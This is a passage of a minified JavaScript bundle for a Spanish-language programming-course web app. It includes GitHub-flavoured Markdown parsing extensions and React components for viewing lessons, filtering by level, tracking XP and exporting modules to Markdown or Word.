o.position.start.offset=="number"&&(o.position.start.column++,o.position.start.offset++,t.position.start=Object.assign({},o.position.start)))}}this.exit(a)}function SB(a,e,t,o){const r=a.children[0],l=typeof a.checked=="boolean"&&r&&r.type==="paragraph",c="["+(a.checked?"x":" ")+"] ",d=t.createTracker(o);l&&d.move(c);let f=oP.listItem(a,e,t,{...o,...d.current()});return l&&(f=f.replace(/^(?:[*+-]|\d+\.)([\r\n]| {1,3})/,p)),f;function p(v){return v+c}}function CB(){return[e4(),S4(),x4(),dB(),vB()]}function AB(a){return{extensions:[a4(),C4(a),j4(),bB(a),yB()]}}const TB={tokenize:LB,partial:!0},iP={tokenize:IB,partial:!0},rP={tokenize:DB,partial:!0},sP={tokenize:wB,partial:!0},xB={tokenize:MB,partial:!0},lP={name:"wwwAutolink",tokenize:qB,previous:uP},cP={name:"protocolAutolink",tokenize:RB,previous:dP},oi={name:"emailAutolink",tokenize:PB,previous:pP},Co={};function jB(){return{text:Co}}let Nr=48;for(;Nr<123;)Co[Nr]=oi,Nr++,Nr===58?Nr=65:Nr===91&&(Nr=97);Co[43]=oi;Co[45]=oi;Co[46]=oi;Co[95]=oi;Co[72]=[oi,cP];Co[104]=[oi,cP];Co[87]=[oi,lP];Co[119]=[oi,lP];function PB(a,e,t){const o=this;let r,l;return c;function c(y){return!Xg(y)||!pP.call(o,o.previous)||_v(o.events)?t(y):(a.enter("literalAutolink"),a.enter("literalAutolinkEmail"),d(y))}function d(y){return Xg(y)?(a.consume(y),d):y===64?(a.consume(y),f):t(y)}function f(y){return y===46?a.check(xB,v,p)(y):y===45||y===95||St(y)?(l=!0,a.consume(y),f):v(y)}function p(y){return a.consume(y),r=!0,f}function v(y){return l&&r&&jt(o.previous)?(a.exit("literalAutolinkEmail"),a.exit("literalAutolink"),e(y)):t(y)}}function qB(a,e,t){const o=this;return r;function r(c){return c!==87&&c!==119||!uP.call(o,o.previous)||_v(o.events)?t(c):(a.enter("literalAutolink"),a.enter("literalAutolinkWww"),a.check(TB,a.attempt(iP,a.attempt(rP,l),t),t)(c))}function l(c){return a.exit("literalAutolinkWww"),a.exit("literalAutolink"),e(c)}}function RB(a,e,t){const o=this;let r="",l=!1;return c;function c(y){return(y===72||y===104)&&dP.call(o,o.previous)&&!_v(o.events)?(a.enter("literalAutolink"),a.enter("literalAutolinkHttp"),r+=String.fromCodePoint(y),a.consume(y),d):t(y)}function d(y){if(jt(y)&&r.length<5)return r+=String.fromCodePoint(y),a.consume(y),d;if(y===58){const S=r.toLowerCase();if(S==="http"||S==="https")return a.consume(y),f}return t(y)}function f(y){return y===47?(a.consume(y),l?p:(l=!0,f)):t(y)}function p(y){return y===null||Kp(y)||Ca(y)||$r(y)||ym(y)?t(y):a.attempt(iP,a.attempt(rP,v),t)(y)}function v(y){return a.exit("literalAutolinkHttp"),a.exit("literalAutolink"),e(y)}}function LB(a,e,t){let o=0;return r;function r(c){return(c===87||c===119)&&o<3?(o++,a.consume(c),r):c===46&&o===3?(a.consume(c),l):t(c)}function l(c){return c===null?t(c):e(c)}}function IB(a,e,t){let o,r,l;return c;function c(p){return p===46||p===95?a.check(sP,f,d)(p):p===null||Ca(p)||$r(p)||p!==45&&ym(p)?f(p):(l=!0,a.consume(p),c)}function d(p){return p===95?o=!0:(r=o,o=void 0),a.consume(p),c}function f(p){return r||o||!l?t(p):e(p)}}function DB(a,e){let t=0,o=0;return r;function r(c){return c===40?(t++,a.consume(c),r):c===41&&o<t?l(c):c===33||c===34||c===38||c===39||c===41||c===42||c===44||c===46||c===58||c===59||c===60||c===63||c===93||c===95||c===126?a.check(sP,e,l)(c):c===null||Ca(c)||$r(c)?e(c):(a.consume(c),r)}function l(c){return c===41&&o++,a.consume(c),r}}function wB(a,e,t){return o;function o(d){return d===33||d===34||d===39||d===41||d===42||d===44||d===46||d===58||d===59||d===63||d===95||d===126?(a.consume(d),o):d===38?(a.consume(d),l):d===93?(a.consume(d),r):d===60||d===null||Ca(d)||$r(d)?e(d):t(d)}function r(d){return d===null||d===40||d===91||Ca(d)||$r(d)?e(d):o(d)}function l(d){return jt(d)?c(d):t(d)}function c(d){return d===59?(a.consume(d),o):jt(d)?(a.consume(d),c):t(d)}}function MB(a,e,t){return o;function o(l){return a.consume(l),r}function r(l){return St(l)?t(l):e(l)}}function uP(a){return a===null||a===40||a===42||a===95||a===91||a===93||a===126||Ca(a)}function dP(a){return!jt(a)}function pP(a){return!(a===47||Xg(a))}function Xg(a){return a===43||a===45||a===46||a===95||St(a)}function _v(a){let e=a.length,t=!1;for(;e--;){const o=a[e][1];if((o.type==="labelLink"||o.type==="labelImage")&&!o._balanced){t=!0;break}if(o._gfmAutolinkLiteralWalkedInto){t=!1;break}}return a.length>0&&!t&&(a[a.length-1][1]._gfmAutolinkLiteralWalkedInto=!0),t}const _B={tokenize:FB,partial:!0};function kB(){return{document:{91:{name:"gfmFootnoteDefinition",tokenize:UB,continuation:{tokenize:BB},exit:VB}},text:{91:{name:"gfmFootnoteCall",tokenize:zB},93:{name:"gfmPotentialFootnoteCall",add:"after",tokenize:NB,resolveTo:OB}}}}function NB(a,e,t){const o=this;let r=o.events.length;const l=o.parser.gfmFootnotes||(o.parser.gfmFootnotes=[]);let c;for(;r--;){const f=o.events[r][1];if(f.type==="labelImage"){c=f;break}if(f.type==="gfmFootnoteCall"||f.type==="labelLink"||f.type==="label"||f.type==="image"||f.type==="link")break}return d;function d(f){if(!c||!c._balanced)return t(f);const p=On(o.sliceSerialize({start:c.end,end:o.now()}));return p.codePointAt(0)!==94||!l.includes(p.slice(1))?t(f):(a.enter("gfmFootnoteCallLabelMarker"),a.consume(f),a.exit("gfmFootnoteCallLabelMarker"),e(f))}}function OB(a,e){let t=a.length;for(;t--;)if(a[t][1].type==="labelImage"&&a[t][0]==="enter"){a[t][1];break}a[t+1][1].type="data",a[t+3][1].type="gfmFootnoteCallLabelMarker";const o={type:"gfmFootnoteCall",start:Object.assign({},a[t+3][1].start),end:Object.assign({},a[a.length-1][1].end)},r={type:"gfmFootnoteCallMarker",start:Object.assign({},a[t+3][1].end),end:Object.assign({},a[t+3][1].end)};r.end.column++,r.end.offset++,r.end._bufferIndex++;const l={type:"gfmFootnoteCallString",start:Object.assign({},r.end),end:Object.assign({},a[a.length-1][1].start)},c={type:"chunkString",contentType:"string",start:Object.assign({},l.start),end:Object.assign({},l.end)},d=[a[t+1],a[t+2],["enter",o,e],a[t+3],a[t+4],["enter",r,e],["exit",r,e],["enter",l,e],["enter",c,e],["exit",c,e],["exit",l,e],a[a.length-2],a[a.length-1],["exit",o,e]];return a.splice(t,a.length-t+1,...d),a}function zB(a,e,t){const o=this,r=o.parser.gfmFootnotes||(o.parser.gfmFootnotes=[]);let l=0,c;return d;function d(y){return a.enter("gfmFootnoteCall"),a.enter("gfmFootnoteCallLabelMarker"),a.consume(y),a.exit("gfmFootnoteCallLabelMarker"),f}function f(y){return y!==94?t(y):(a.enter("gfmFootnoteCallMarker"),a.consume(y),a.exit("gfmFootnoteCallMarker"),a.enter("gfmFootnoteCallString"),a.enter("chunkString").contentType="string",p)}function p(y){if(l>999||y===93&&!c||y===null||y===91||Ca(y))return t(y);if(y===93){a.exit("chunkString");const S=a.exit("gfmFootnoteCallString");return r.includes(On(o.sliceSerialize(S)))?(a.enter("gfmFootnoteCallLabelMarker"),a.consume(y),a.exit("gfmFootnoteCallLabelMarker"),a.exit("gfmFootnoteCall"),e):t(y)}return Ca(y)||(c=!0),l++,a.consume(y),y===92?v:p}function v(y){return y===91||y===92||y===93?(a.consume(y),l++,p):p(y)}}function UB(a,e,t){const o=this,r=o.parser.gfmFootnotes||(o.parser.gfmFootnotes=[]);let l,c=0,d;return f;function f(R){return a.enter("gfmFootnoteDefinition")._container=!0,a.enter("gfmFootnoteDefinitionLabel"),a.enter("gfmFootnoteDefinitionLabelMarker"),a.consume(R),a.exit("gfmFootnoteDefinitionLabelMarker"),p}function p(R){return R===94?(a.enter("gfmFootnoteDefinitionMarker"),a.consume(R),a.exit("gfmFootnoteDefinitionMarker"),a.enter("gfmFootnoteDefinitionLabelString"),a.enter("chunkString").contentType="string",v):t(R)}function v(R){if(c>999||R===93&&!d||R===null||R===91||Ca(R))return t(R);if(R===93){a.exit("chunkString");const L=a.exit("gfmFootnoteDefinitionLabelString");return l=On(o.sliceSerialize(L)),a.enter("gfmFootnoteDefinitionLabelMarker"),a.consume(R),a.exit("gfmFootnoteDefinitionLabelMarker"),a.exit("gfmFootnoteDefinitionLabel"),S}return Ca(R)||(d=!0),c++,a.consume(R),R===92?y:v}function y(R){return R===91||R===92||R===93?(a.consume(R),c++,v):v(R)}function S(R){return R===58?(a.enter("definitionMarker"),a.consume(R),a.exit("definitionMarker"),r.includes(l)||r.push(l),oa(a,A,"gfmFootnoteDefinitionWhitespace")):t(R)}function A(R){return e(R)}}function BB(a,e,t){return a.check(Au,e,a.attempt(_B,e,t))}function VB(a){a.exit("gfmFootnoteDefinition")}function FB(a,e,t){const o=this;return oa(a,r,"gfmFootnoteDefinitionIndent",5);function r(l){const c=o.events[o.events.length-1];return c&&c[1].type==="gfmFootnoteDefinitionIndent"&&c[2].sliceSerialize(c[1],!0).length===4?e(l):t(l)}}function HB(a){let t=(a||{}).singleTilde;const o={name:"strikethrough",tokenize:l,resolveAll:r};return t==null&&(t=!0),{text:{126:o},insideSpan:{null:[o]},attentionMarkers:{null:[126]}};function r(c,d){let f=-1;for(;++f<c.length;)if(c[f][0]==="enter"&&c[f][1].type==="strikethroughSequenceTemporary"&&c[f][1]._close){let p=f;for(;p--;)if(c[p][0]==="exit"&&c[p][1].type==="strikethroughSequenceTemporary"&&c[p][1]._open&&c[f][1].end.offset-c[f][1].start.offset===c[p][1].end.offset-c[p][1].start.offset){c[f][1].type="strikethroughSequence",c[p][1].type="strikethroughSequence";const v={type:"strikethrough",start:Object.assign({},c[p][1].start),end:Object.assign({},c[f][1].end)},y={type:"strikethroughText",start:Object.assign({},c[p][1].end),end:Object.assign({},c[f][1].start)},S=[["enter",v,d],["enter",c[p][1],d],["exit",c[p][1],d],["enter",y,d]],A=d.parser.constructs.insideSpan.null;A&&Zt(S,S.length,0,Em(A,c.slice(p+1,f),d)),Zt(S,S.length,0,[["exit",y,d],["enter",c[f][1],d],["exit",c[f][1],d],["exit",v,d]]),Zt(c,p-1,f-p+3,S),f=p+S.length-2;break}}for(f=-1;++f<c.length;)c[f][1].type==="strikethroughSequenceTemporary"&&(c[f][1].type="data");return c}function l(c,d,f){const p=this.previous,v=this.events;let y=0;return S;function S(R){return p===126&&v[v.length-1][1].type!=="characterEscape"?f(R):(c.enter("strikethroughSequenceTemporary"),A(R))}function A(R){const L=ll(p);if(R===126)return y>1?f(R):(c.consume(R),y++,A);if(y<2&&!t)return f(R);const x=c.exit("strikethroughSequenceTemporary"),D=ll(R);return x._open=!D||D===2&&!!L,x._close=!L||L===2&&!!D,d(R)}}}class GB{constructor(){this.map=[]}add(e,t,o){JB(this,e,t,o)}consume(e){if(this.map.sort(function(l,c){return l[0]-c[0]}),this.map.length===0)return;let t=this.map.length;const o=[];for(;t>0;)t-=1,o.push(e.slice(this.map[t][0]+this.map[t][1]),this.map[t][2]),e.length=this.map[t][0];o.push(e.slice()),e.length=0;let r=o.pop();for(;r;){for(const l of r)e.push(l);r=o.pop()}this.map.length=0}}function JB(a,e,t,o){let r=0;if(!(t===0&&o.length===0)){for(;r<a.map.length;){if(a.map[r][0]===e){a.map[r][1]+=t,a.map[r][2].push(...o);return}r+=1}a.map.push([e,t,o])}}function QB(a,e){let t=!1;const o=[];for(;e<a.length;){const r=a[e];if(t){if(r[0]==="enter")r[1].type==="tableContent"&&o.push(a[e+1][1].type==="tableDelimiterMarker"?"left":"none");else if(r[1].type==="tableContent"){if(a[e-1][1].type==="tableDelimiterMarker"){const l=o.length-1;o[l]=o[l]==="left"?"center":"right"}}else if(r[1].type==="tableDelimiterRow")break}else r[0]==="enter"&&r[1].type==="tableDelimiterRow"&&(t=!0);e+=1}return o}function WB(){return{flow:{null:{name:"table",tokenize:KB,resolveAll:$B}}}}function KB(a,e,t){const o=this;let r=0,l=0,c;return d;function d(j){let _=o.events.length-1;for(;_>-1;){const ge=o.events[_][1].type;if(ge==="lineEnding"||ge==="linePrefix")_--;else break}const z=_>-1?o.events[_][1].type:null,N=z==="tableHead"||z==="tableRow"?Q:f;return N===Q&&o.parser.lazy[o.now().line]?t(j):N(j)}function f(j){return a.enter("tableHead"),a.enter("tableRow"),p(j)}function p(j){return j===124||(c=!0,l+=1),v(j)}function v(j){return j===null?t(j):Re(j)?l>1?(l=0,o.interrupt=!0,a.exit("tableRow"),a.enter("lineEnding"),a.consume(j),a.exit("lineEnding"),A):t(j):Qe(j)?oa(a,v,"whitespace")(j):(l+=1,c&&(c=!1,r+=1),j===124?(a.enter("tableCellDivider"),a.consume(j),a.exit("tableCellDivider"),c=!0,v):(a.enter("data"),y(j)))}function y(j){return j===null||j===124||Ca(j)?(a.exit("data"),v(j)):(a.consume(j),j===92?S:y)}function S(j){return j===92||j===124?(a.consume(j),y):y(j)}function A(j){return o.interrupt=!1,o.parser.lazy[o.now().line]?t(j):(a.enter("tableDelimiterRow"),c=!1,Qe(j)?oa(a,R,"linePrefix",o.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(j):R(j))}function R(j){return j===45||j===58?x(j):j===124?(c=!0,a.enter("tableCellDivider"),a.consume(j),a.exit("tableCellDivider"),L):ue(j)}function L(j){return Qe(j)?oa(a,x,"whitespace")(j):x(j)}function x(j){return j===58?(l+=1,c=!0,a.enter("tableDelimiterMarker"),a.consume(j),a.exit("tableDelimiterMarker"),D):j===45?(l+=1,D(j)):j===null||Re(j)?ee(j):ue(j)}function D(j){return j===45?(a.enter("tableDelimiterFiller"),G(j)):ue(j)}function G(j){return j===45?(a.consume(j),G):j===58?(c=!0,a.exit("tableDelimiterFiller"),a.enter("tableDelimiterMarker"),a.consume(j),a.exit("tableDelimiterMarker"),B):(a.exit("tableDelimiterFiller"),B(j))}function B(j){return Qe(j)?oa(a,ee,"whitespace")(j):ee(j)}function ee(j){return j===124?R(j):j===null||Re(j)?!c||r!==l?ue(j):(a.exit("tableDelimiterRow"),a.exit("tableHead"),e(j)):ue(j)}function ue(j){return t(j)}function Q(j){return a.enter("tableRow"),w(j)}function w(j){return j===124?(a.enter("tableCellDivider"),a.consume(j),a.exit("tableCellDivider"),w):j===null||Re(j)?(a.exit("tableRow"),e(j)):Qe(j)?oa(a,w,"whitespace")(j):(a.enter("data"),I(j))}function I(j){return j===null||j===124||Ca(j)?(a.exit("data"),w(j)):(a.consume(j),j===92?k:I)}function k(j){return j===92||j===124?(a.consume(j),I):I(j)}}function $B(a,e){let t=-1,o=!0,r=0,l=[0,0,0,0],c=[0,0,0,0],d=!1,f=0,p,v,y;const S=new GB;for(;++t<a.length;){const A=a[t],R=A[1];A[0]==="enter"?R.type==="tableHead"?(d=!1,f!==0&&(VA(S,e,f,p,v),v=void 0,f=0),p={type:"table",start:Object.assign({},R.start),end:Object.assign({},R.end)},S.add(t,0,[["enter",p,e]])):R.type==="tableRow"||R.type==="tableDelimiterRow"?(o=!0,y=void 0,l=[0,0,0,0],c=[0,t+1,0,0],d&&(d=!1,v={type:"tableBody",start:Object.assign({},R.start),end:Object.assign({},R.end)},S.add(t,0,[["enter",v,e]])),r=R.type==="tableDelimiterRow"?2:v?3:1):r&&(R.type==="data"||R.type==="tableDelimiterMarker"||R.type==="tableDelimiterFiller")?(o=!1,c[2]===0&&(l[1]!==0&&(c[0]=c[1],y=sp(S,e,l,r,void 0,y),l=[0,0,0,0]),c[2]=t)):R.type==="tableCellDivider"&&(o?o=!1:(l[1]!==0&&(c[0]=c[1],y=sp(S,e,l,r,void 0,y)),l=c,c=[l[1],t,0,0])):R.type==="tableHead"?(d=!0,f=t):R.type==="tableRow"||R.type==="tableDelimiterRow"?(f=t,l[1]!==0?(c[0]=c[1],y=sp(S,e,l,r,t,y)):c[1]!==0&&(y=sp(S,e,c,r,t,y)),r=0):r&&(R.type==="data"||R.type==="tableDelimiterMarker"||R.type==="tableDelimiterFiller")&&(c[3]=t)}for(f!==0&&VA(S,e,f,p,v),S.consume(e.events),t=-1;++t<e.events.length;){const A=e.events[t];A[0]==="enter"&&A[1].type==="table"&&(A[1]._align=QB(e.events,t))}return a}function sp(a,e,t,o,r,l){const c=o===1?"tableHeader":o===2?"tableDelimiter":"tableData",d="tableContent";t[0]!==0&&(l.end=Object.assign({},Ws(e.events,t[0])),a.add(t[0],0,[["exit",l,e]]));const f=Ws(e.events,t[1]);if(l={type:c,start:Object.assign({},f),end:Object.assign({},f)},a.add(t[1],0,[["enter",l,e]]),t[2]!==0){const p=Ws(e.events,t[2]),v=Ws(e.events,t[3]),y={type:d,start:Object.assign({},p),end:Object.assign({},v)};if(a.add(t[2],0,[["enter",y,e]]),o!==2){const S=e.events[t[2]],A=e.events[t[3]];if(S[1].end=Object.assign({},A[1].end),S[1].type="chunkText",S[1].contentType="text",t[3]>t[2]+1){const R=t[2]+1,L=t[3]-t[2]-1;a.add(R,L,[])}}a.add(t[3]+1,0,[["exit",y,e]])}return r!==void 0&&(l.end=Object.assign({},Ws(e.events,r)),a.add(r,0,[["exit",l,e]]),l=void 0),l}function VA(a,e,t,o,r){const l=[],c=Ws(e.events,t);r&&(r.end=Object.assign({},c),l.push(["exit",r,e])),o.end=Object.assign({},c),l.push(["exit",o,e]),a.add(t+1,0,l)}function Ws(a,e){const t=a[e],o=t[0]==="enter"?"start":"end";return t[1][o]}const YB={name:"tasklistCheck",tokenize:ZB};function XB(){return{text:{91:YB}}}function ZB(a,e,t){const o=this;return r;function r(f){return o.previous!==null||!o._gfmTasklistFirstContentOfListItem?t(f):(a.enter("taskListCheck"),a.enter("taskListCheckMarker"),a.consume(f),a.exit("taskListCheckMarker"),l)}function l(f){return Ca(f)?(a.enter("taskListCheckValueUnchecked"),a.consume(f),a.exit("taskListCheckValueUnchecked"),c):f===88||f===120?(a.enter("taskListCheckValueChecked"),a.consume(f),a.exit("taskListCheckValueChecked"),c):t(f)}function c(f){return f===93?(a.enter("taskListCheckMarker"),a.consume(f),a.exit("taskListCheckMarker"),a.exit("taskListCheck"),d):t(f)}function d(f){return Re(f)?e(f):Qe(f)?a.check({tokenize:e5},e,t)(f):t(f)}}function e5(a,e,t){return oa(a,o,"whitespace");function o(r){return r===null?t(r):e(r)}}function a5(a){return Aj([jB(),kB(),HB(a),WB(),XB()])}const t5={};function FA(a){const e=this,t=a||t5,o=e.data(),r=o.micromarkExtensions||(o.micromarkExtensions=[]),l=o.fromMarkdownExtensions||(o.fromMarkdownExtensions=[]),c=o.toMarkdownExtensions||(o.toMarkdownExtensions=[]);r.push(a5(t)),l.push(CB()),c.push(AB(t))}const n5=({lesson:a,moduleId:e,moduleTitle:t,onComplete:o,onPrev:r,onNext:l,hasPrev:c,hasNext:d})=>{const[f,p]=F.useState(!1),{toggleChecklistItem:v,isChecklistItemCompleted:y,toggleFavorite:S,isFavorite:A}=gl();mt.useEffect(()=>{p(!1)},[a.id]);const R=A(a.id);return g.jsxs("div",{className:"lesson-viewer",children:[g.jsxs("header",{className:"lesson-viewer-header",children:[g.jsxs("div",{className:"title-area",children:[g.jsx("h2",{children:a.title}),g.jsx("button",{className:`btn-favorite ${R?"active":""}`,onClick:()=>S(e,a.id,a.title,t),title:R?"Quitar de favoritos":"Marcar como favorito",children:R?"":""})]}),g.jsx("span",{className:`status-badge ${a.completed?"completed":"pending"}`,children:a.completed?"Completada":"En progreso"})]}),g.jsxs("div",{className:"lesson-viewer-content",children:[a.level&&g.jsxs("div",{className:`level-indicator ${a.level}`,children:["Nivel ",a.level.charAt(0).toUpperCase()+a.level.slice(1)]}),a.isProject?g.jsxs("div",{className:"project-section",children:[g.jsxs("div",{className:"project-header",children:[g.jsx("span",{className:"project-badge",children:"PROYECTO"}),g.jsx("h3",{children:a.title})]}),g.jsx("div",{className:"project-content markdown-body",children:g.jsx(_A,{remarkPlugins:[FA],children:a.explanation||a.content||""})}),g.jsxs("div",{className:"project-details",children:[g.jsxs("div",{className:"project-block",children:[g.jsx("h4",{children:" Consigna"}),g.jsx("ul",{className:"project-list",children:a.projectRequirements?a.projectRequirements.map((L,x)=>g.jsx("li",{children:L},x)):a.exercises?.map((L,x)=>g.jsx("li",{children:L},x))})]}),g.jsxs("div",{className:"project-block",children:[g.jsx("h4",{children:" Sugerencias"}),g.jsx("ul",{className:"project-list",children:(a.projectSuggestions||a.bestPractices)?.map((L,x)=>g.jsx("li",{children:L},x))})]})]}),a.solution&&g.jsxs("div",{className:"project-solution-section",children:[g.jsx("button",{className:"btn-show-solution",onClick:()=>p(!f),children:f?"Ocultar resultado esperado":"Ver resultado esperado"}),f&&g.jsxs("div",{className:"project-outcome",children:[g.jsx("h4",{children:" Cdigo de referencia:"}),g.jsx(np,{code:a.solution,language:a.id.includes("html")?"html":a.id.includes("js")?"javascript":a.id.includes("ts")?"typescript":a.id.includes("react")?"javascript":"css"})]})]})]}):g.jsxs(g.Fragment,{children:[a.objective&&g.jsxs("div",{className:"lesson-section objective",children:[g.jsx("h3",{children:" Objetivo"}),g.jsx("p",{children:a.objective})]}),g.jsx("div",{className:"content-text markdown-body",children:g.jsx(_A,{remarkPlugins:[FA],children:a.content||a.explanation||""})}),a.examples&&a.examples.length>0&&g.jsxs("div",{className:"lesson-section examples",children:[g.jsx("h3",{children:" Ejemplos"}),a.examples.map((L,x)=>g.jsx(np,{code:L,language:a.id.includes("html")?"html":a.id.includes("js")?"javascript":a.id.includes("ts")?"typescript":a.id.includes("react")?"javascript":"css"},x))]}),a.commonMistakes&&a.commonMistakes.length>0&&g.jsxs("div",{className:"lesson-section common-mistakes",children:[g.jsx("h3",{children:" Errores Comunes"}),g.jsx("ul",{className:"modern-list",children:a.commonMistakes.map((L,x)=>g.jsx("li",{children:L},x))})]}),a.bestPractices&&a.bestPractices.length>0&&g.jsxs("div",{className:"lesson-section best-practices",children:[g.jsx("h3",{children:" Buenas Prcticas"}),g.jsx("ul",{className:"modern-list",children:a.bestPractices.map((L,x)=>g.jsx("li",{children:L},x))})]}),a.exercises&&a.exercises.length>0&&g.jsxs("div",{className:"lesson-section exercises",children:[g.jsx("h3",{children:" Ejercicios"}),g.jsx("ul",{className:"modern-list",children:a.exercises.map((L,x)=>g.jsx("li",{children:L},x))})]}),a.level==="senior"&&a.extraNotes&&g.jsxs("div",{className:"lesson-section senior-notes",children:[g.jsx("h3",{children:" Notas para Seniors"}),g.jsx("p",{children:a.extraNotes})]}),!a.explanation&&a.checklist&&a.checklist.length>0&&g.jsxs("div",{className:"checklist-section",children:[g.jsx("h4",{children:" Checklist de aprendizaje"}),g.jsx("ul",{className:"checklist-list",children:a.checklist.map((L,x)=>{const D=y(e,a.id,L);return g.jsx("li",{className:"checklist-item",children:g.jsxs("label",{children:[g.jsx("input",{type:"checkbox",checked:D,onChange:()=>v(e,a.id,L)}),g.jsx("span",{className:D?"checked":"",children:L})]})},x)})})]}),!a.examples&&a.code&&g.jsxs("div",{className:"code-section",children:[g.jsx("h4",{children:" Ejemplo de cdigo:"}),g.jsx(np,{code:a.code,language:a.id.includes("html")?"html":a.id.includes("js")?"javascript":a.id.includes("ts")?"typescript":a.id.includes("react")?"javascript":"css"})]}),!a.exercises&&a.exercise&&g.jsxs("div",{className:"exercise-section",children:[g.jsx("h3",{children:" Ejercicio"}),g.jsx("p",{className:"exercise-prompt",children:a.exercise}),a.hint&&g.jsxs("details",{className:"exercise-hint",children:[g.jsx("summary",{children:" Ver pista"}),g.jsx("p",{children:a.hint})]}),g.jsx("div",{className:"exercise-actions",children:g.jsx("button",{className:"btn-show-solution",onClick:()=>p(!f),children:f?"Ocultar solucin":"Ver solucin"})}),f&&a.solution&&g.jsxs("div",{className:"exercise-solution",children:[g.jsx("h4",{children:"Solucin sugerida:"}),g.jsx(np,{code:a.solution,language:a.id.includes("html")?"html":a.id.includes("js")?"javascript":a.id.includes("ts")?"typescript":a.id.includes("react")?"javascript":"css"})]})]})]})]}),g.jsxs("footer",{className:"lesson-viewer-footer",children:[g.jsxs("div",{className:"nav-buttons",children:[g.jsx("button",{className:"btn-nav",disabled:!c,onClick:r,children:" Anterior"}),g.jsx("button",{className:"btn-nav",disabled:!d,onClick:l,children:"Siguiente "})]}),g.jsx("button",{className:`btn-complete ${a.completed?"disabled":""}`,disabled:a.completed,onClick:()=>o&&o(a.id),children:a.completed?"Leccin Completada":"Marcar como completada"})]})]})},o5=({moduleName:a,lessonName:e})=>g.jsx("nav",{className:"breadcrumbs","aria-label":"Breadcrumb",children:g.jsxs("ol",{className:"breadcrumbs-list",children:[g.jsx("li",{className:"breadcrumb-item",children:g.jsx(Xt,{to:"/roadmap",children:"Ruta"})}),a&&g.jsxs(g.Fragment,{children:[g.jsx("li",{className:"breadcrumb-separator",children:"/"}),g.jsx("li",{className:"breadcrumb-item",children:g.jsx("span",{className:"breadcrumb-module",children:a})})]}),e&&g.jsxs(g.Fragment,{children:[g.jsx("li",{className:"breadcrumb-separator",children:"/"}),g.jsx("li",{className:"breadcrumb-item active","aria-current":"page",children:e})]})]})}),i5=()=>{const{moduleId:a}=dk(),{search:e}=Bn(),[t,o]=F.useState(null),[r,l]=F.useState("all"),{markAsCompleted:c,isLessonCompleted:d,xp:f,calculateLevel:p,updateLastLesson:v,getLastLesson:y,addToHistory:S}=gl(),A=F.useMemo(()=>p(f),[f,p]),R=A.level,L={junior:1,"semi-senior":2,senior:3},x=a?ej(a):void 0,D=j=>{if(!x)return;let _="";if(j==="md")_=`# ${x.title}

${x.description}

---

`,x.lessons.forEach((me,K)=>{_+=`## ${K+1}. ${me.title} (${me.level?.toUpperCase()})

`,_+=`${me.content}

---

`});else{const me=`<html xmlns:o='urn:schemas-microsoft-com:office:office' xmlns:w='urn:schemas-microsoft-com:office:word' xmlns='http://www.w3.org/TR/REC-html40'><head><meta charset='utf-8'><title>${x.title}</title><style>body { font-family: sans-serif; } .lesson { margin-bottom: 40px; border-bottom: 1px solid #ccc; padding-bottom: 20px; }</style></head><body>`,K="</body></html>";let pe=`<h1>${x.title}</h1><p>${x.description}</p><hr/>`;x.lessons.forEach((ye,Me)=>{pe+=`<div class="lesson"><h2>${Me+1}. ${ye.title}</h2><pre style="white-space: pre-wrap;">${ye.content}</pre></div>`}),_=me+pe+K}const z=new Blob([_],{type:j==="md"?"text/markdown":"application/msword"}),N=URL.createObjectURL(z),ge=document.createElement("a");ge.href=N,ge.download=`${x.id}-completo.${j}`,document.body.appendChild(ge),ge.click(),document.body.removeChild(ge),URL.revokeObjectURL(N)};if(mt.useEffect(()=>{if(!x)return;const _=new URLSearchParams(e).get("lesson");if(_&&x.lessons.some(z=>z.id===_))o(_);else if(!t){const z=y(x.id);if(z&&x.lessons.some(N=>N.id===z))o(z);else if(x.lessons.length>0){const N=r==="all"?x.lessons:x.lessons.filter(ge=>ge.level===r);N.length>0?o(N[0].id):o(x.lessons[0].id)}}},[a,e,t,r,x,y]),mt.useEffect(()=>{if(x&&t){const j=x.lessons.find(_=>_.id===t);j&&(v(x.id,t),S(t,x.id,j.title,x.title))}},[t,x?.id]),!x)return g.jsxs("div",{className:"module-not-found",children:[g.jsx("h2",{children:"Mdulo no encontrado"}),g.jsx("p",{children:"Lo sentimos, el mdulo que buscas no existe o est en desarrollo."}),g.jsx(Xt,{to:"/roadmap",className:"btn-back",children:"Volver a la Ruta"})]});const G=x.lessons.filter(j=>r==="all"||j.level===r),B=x.lessons.find(j=>j.id===t),ee=B?x.lessons.findIndex(j=>j.id===t):-1,ue=ee>0,Q=ee!==-1&&ee<x.lessons.length-1,w=()=>{ue&&o(x.lessons[ee-1].id)},I=()=>{Q&&o(x.lessons[ee+1].id)},k=j=>j?(L[j]||1)>R:!1;return g.jsxs("div",{className:"lesson-page-container",children:[g.jsx(o5,{moduleName:x.title.split(":")[0],lessonName:B?.title}),g.jsxs("header",{className:"module-header",children:[g.jsxs("div",{className:"module-info-container",children:[g.jsxs("div",{className:"module-title-row",children:[g.jsx("h1",{className:"module-title",children:x.title}),g.jsxs("div",{className:"header-actions",children:[g.jsx(Xt,{to:"/roadmap",className:"btn-back-roadmap",children:" Volver a la Ruta"}),g.jsxs("div",{className:"export-actions",children:[g.jsx("span",{className:"export-label",children:"Exportar:"}),g.jsx("button",{className:"btn-export-mini",onClick:()=>D("md"),title:"Descargar como Markdown",children:".MD"}),g.jsx("button",{className:"btn-export-mini",onClick:()=>D("doc"),title:"Descargar como Word (.doc)",children:"WORD"}),g.jsx("button",{className:"btn-export-mini",onClick:()=>window.print(),title:"Imprimir / Guardar como PDF",children:"PDF"})]})]})]}),g.jsx("p",{className:"module-desc",children:x.description})]}),g.jsxs("div",{className:"level-status-card",children:[g.jsxs("span",{className:"user-level-badge",children:["Tu Nivel: ",R]}),g.jsx("div",{className:"xp-progress-mini",children:g.jsx("div",{className:"xp-bar-fill",style:{width:`${(f-A.currentLevelMin)/(A.nextLevelXp-A.currentLevelMin)*100}%`}})})]})]}),g.jsxs("div",{className:"lesson-layout",children:[g.jsxs("aside",{className:"lesson-sidebar",children:[g.jsxs("div",{className:"sidebar-header",children:[g.jsx("h3",{children:"Lecciones"}),g.jsx("div",{className:"level-filter",children:g.jsxs("select",{value:r,onChange:j=>l(j.target.value),className:"filter-select",children:[g.jsx("option",{value:"all",children:"Todos los niveles"}),g.jsx("option",{value:"junior",children:"Junior"}),g.jsx("option",{value:"semi-senior",children:"Semi-Senior"}),g.jsx("option",{value:"senior",children:"Senior"})]})})]}),g.jsx("ul",{className:"lesson-list",children:G.length>0?G.map(j=>{const 